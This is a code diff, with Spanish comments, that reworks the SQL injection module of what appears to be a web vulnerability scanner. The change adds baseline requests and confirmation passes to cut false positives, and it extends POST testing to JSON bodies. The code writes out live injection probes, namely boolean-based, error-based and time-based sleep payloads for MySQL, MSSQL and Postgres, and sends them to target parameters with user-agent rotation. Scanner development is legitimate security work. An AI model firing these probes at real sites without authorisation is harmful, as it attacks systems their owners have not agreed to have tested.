@@ -2555,57 +2555,91 @@ def mod_sqli(ctx):
 
     log_info(f"Probando {len(params)} parametros con {len(SQLI_PAYLOADS)} payloads...")
     base = url.split("?")[0]
+    rl = ctx["rate_limiter"]
+    rua = ctx["mode_config"]["rotate_ua"]
+
+    def timed_get(full_url, timeout=15):
+        # Devuelve (respuesta|None, segundos_transcurridos)
+        start = time.time()
+        resp = safe_request(session, "GET", full_url, rl, rua, timeout=timeout)
+        return resp, time.time() - start
 
     for param in params:
-        # Error-based SQLi
+        # ---- Linea base (peticion benigna) para comparar longitud/tiempo ----
+        benign_val = "1"
+        base_resp, base_time = timed_get(f"{base}?{param}={benign_val}")
+        base_len = len(base_resp.content) if base_resp else None
+        base_body = base_resp.text.lower() if base_resp else ""
+        tol = max(50, int((base_len or 0) * 0.05))  # tolerancia de longitud (5% o 50B)
+
+        # ---- Error-based SQLi (solo errores que NO esten ya en la linea base) ----
         for payload in SQLI_PAYLOADS:
-            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
-                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}", rl, rua)
             if not r:
                 continue
             body = r.text.lower()
-            for error in SQLI_ERRORS:
-                if error in body:
-                    log_vuln("CRITICAL", f"SQLi (error-based): param={param} payload={payload[:40]}")
-                    log_info(f"  Error: {error}")
-                    findings.append({"param": param, "type": "error-based", "payload": payload,
-                                   "error": error, "severity": "CRITICAL"})
+            hit = next((e for e in SQLI_ERRORS if e in body and e not in base_body), None)
+            if hit:
+                log_vuln("CRITICAL", f"SQLi (error-based): param={param} payload={payload[:40]}")
+                log_info(f"  Error: {hit}")
+                findings.append({"param": param, "type": "error-based", "payload": payload,
+                               "error": hit, "severity": "CRITICAL"})
+                break  # un hallazgo confirmado por parametro basta
+
+        # ---- Boolean-based blind SQLi (relativo a baseline + confirmacion) ----
+        r_true = safe_request(session, "GET", f"{base}?{param}={benign_val}' AND '1'='1", rl, rua)
+        r_false = safe_request(session, "GET", f"{base}?{param}={benign_val}' AND '1'='2", rl, rua)
+        if r_true and r_false and base_resp is not None:
+            len_true, len_false = len(r_true.content), len(r_false.content)
+            diff_tf = abs(len_true - len_false)
+            rel = diff_tf / max(base_len, 1)
+            close_true = abs(len_true - base_len) <= tol   # TRUE ~ baseline
+            if (r_true.status_code == r_false.status_code
+                    and diff_tf > 80 and rel > 0.05 and close_true):
+                # Confirmacion: repetir TRUE; debe seguir pareciendose a la baseline
+                r_true2 = safe_request(session, "GET", f"{base}?{param}={benign_val}' AND '1'='1", rl, rua)
+                if r_true2 and abs(len(r_true2.content) - len_true) <= tol:
+                    log_vuln("HIGH", f"SQLi (blind boolean): param={param} "
+                                     f"baseline={base_len}B true={len_true}B false={len_false}B")
+                    findings.append({"param": param, "type": "blind-boolean",
+                                     "baseline_len": base_len, "true_len": len_true,
+                                     "false_len": len_false, "severity": "HIGH"})
+
+        # ---- Time-based blind SQLi (baseline de tiempo + doble confirmacion) ----
+        for sleep_payload in ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' AND pg_sleep(5)--"]:
+            r1, t1 = timed_get(f"{base}?{param}={quote(sleep_payload)}", timeout=20)
+            # El primer intento debe superar el umbral absoluto Y la baseline + 4s
+            if t1 >= 4.5 and t1 >= base_time + 4.0:
+                # Confirmar: una peticion benigna debe ser rapida y un 2do sleep debe tardar
+                _, tc = timed_get(f"{base}?{param}={benign_val}")
+                r2, t2 = timed_get(f"{base}?{param}={quote(sleep_payload)}", timeout=20)
+                if tc < 4.0 and t2 >= 4.5:
+                    log_vuln("CRITICAL", f"SQLi (time-based blind): param={param} "
+                                         f"delays={t1:.1f}s/{t2:.1f}s baseline={base_time:.1f}s")
+                    findings.append({"param": param, "type": "time-based",
+                                     "delay": round(t1, 2), "delay_confirm": round(t2, 2),
+                                     "baseline": round(base_time, 2),
+                                     "payload": sleep_payload, "severity": "CRITICAL"})
                     break
 
-        # Boolean-based blind SQLi
-        r_true = safe_request(session, "GET", f"{base}?{param}=1' AND '1'='1",
-                            ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
-        r_false = safe_request(session, "GET", f"{base}?{param}=1' AND '1'='2",
-                             ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
-        if r_true and r_false:
-            if r_true.status_code == r_false.status_code and abs(len(r_true.content) - len(r_false.content)) > 50:
-                log_vuln("HIGH", f"SQLi (blind boolean): param={param} - respuestas diferentes")
-                findings.append({"param": param, "type": "blind-boolean", "severity": "HIGH"})
-
-        # Time-based blind SQLi
-        for sleep_payload in ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' AND pg_sleep(5)--"]:
-            start = time.time()
-            r = safe_request(session, "GET", f"{base}?{param}={quote(sleep_payload)}",
-                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"], timeout=15)
-            elapsed = time.time() - start
-            if elapsed >= 4.5:
-                log_vuln("CRITICAL", f"SQLi (time-based blind): param={param} delay={elapsed:.1f}s")
-                findings.append({"param": param, "type": "time-based", "delay": elapsed,
-                               "payload": sleep_payload, "severity": "CRITICAL"})
-                break
-
-        # POST-based SQLi
+        # ---- POST-based SQLi (cuerpo form-urlencoded Y JSON) ----
+        post_found = False
         for payload in SQLI_PAYLOADS[:8]:
-            r = safe_request(session, "POST", base, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
-                           data={param: payload})
-            if r:
+            for kind, kwargs in (("form", {"data": {param: payload}}),
+                                 ("json", {"json": {param: payload}})):
+                r = safe_request(session, "POST", base, rl, rua, **kwargs)
+                if not r:
+                    continue
                 body = r.text.lower()
-                for error in SQLI_ERRORS:
-                    if error in body:
-                        log_vuln("CRITICAL", f"SQLi POST (error-based): param={param}")
-                        findings.append({"param": param, "type": "post-error-based",
-                                       "payload": payload, "severity": "CRITICAL"})
-                        break
+                hit = next((e for e in SQLI_ERRORS if e in body and e not in base_body), None)
+                if hit:
+                    log_vuln("CRITICAL", f"SQLi POST ({kind}, error-based): param={param}")
+                    findings.append({"param": param, "type": f"post-{kind}-error-based",
+                                     "payload": payload, "error": hit, "severity": "CRITICAL"})
+                    post_found = True
+                    break
+            if post_found:
+                break
 
     ctx["results"]["sqli"] = findings
 
